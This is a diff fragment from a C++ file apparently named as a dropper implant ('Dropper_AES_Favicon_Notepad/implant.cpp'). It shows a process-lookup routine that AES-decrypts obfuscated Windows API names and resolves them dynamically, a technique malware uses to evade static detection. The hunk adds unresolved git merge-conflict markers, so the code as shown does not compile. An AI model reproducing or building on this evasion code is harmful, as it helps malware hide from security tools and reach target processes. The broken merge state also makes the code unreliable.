@@ -158,17 +158,29 @@ int GePr(const char *pname) {
         PROCESSENTRY32 pe32;
         int pid = 0;
 		
+<<<<<<< HEAD:coding/c/Dropper_AES_Favicon_Notepad/implant.cpp
+		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), k, sizeof(k)); 
+=======
 		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), k, sizeof(k));
+>>>>>>> bfaca40df49938424587decf888ec053398cc905:coding/cplusplus/Dropper_AES_Favicon_Notepad/implant.cpp
 		AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), k, sizeof(k));
 		AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), k, sizeof(k));
 		AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), k, sizeof(k));
 		
+<<<<<<< HEAD:coding/c/Dropper_AES_Favicon_Notepad/implant.cpp
+		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(sKdll), sCreateToolhelp32Snapshot); 
+=======
 		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(sKdll), sCreateToolhelp32Snapshot);
+>>>>>>> bfaca40df49938424587decf888ec053398cc905:coding/cplusplus/Dropper_AES_Favicon_Notepad/implant.cpp
 		pProcess32First = GetProcAddress(GetModuleHandle(sKdll), sProcess32First);
 		pProcess32Next = GetProcAddress(GetModuleHandle(sKdll), sProcess32Next);
 		pCloseHandle = GetProcAddress(GetModuleHandle(sKdll), sCloseHandle);
                 
+<<<<<<< HEAD:coding/c/Dropper_AES_Favicon_Notepad/implant.cpp
+        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
+=======
         hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+>>>>>>> bfaca40df49938424587decf888ec053398cc905:coding/cplusplus/Dropper_AES_Favicon_Notepad/implant.cpp
 		
         if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                 
